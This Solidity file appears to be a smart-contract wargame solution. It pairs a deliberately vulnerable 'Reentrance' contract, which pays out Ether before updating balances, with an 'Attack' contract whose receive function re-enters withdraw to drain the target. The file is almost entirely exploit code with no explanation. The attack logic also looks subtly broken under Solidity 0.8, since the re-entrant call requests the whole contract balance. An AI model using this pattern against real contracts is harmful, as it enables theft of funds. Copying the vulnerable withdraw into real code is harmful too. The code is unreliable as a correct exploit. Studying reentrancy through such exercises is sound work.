// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {console} from "forge-std/console.sol";

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance private reentrance;

    constructor(address _reentrance) {
        reentrance = Reentrance(payable(_reentrance));
    }

    function donate() external {
        reentrance.donate(address(this));
    }

    function attack() external {
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint256 reentranceBalance = address(reentrance).balance;

        if (reentranceBalance > 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}
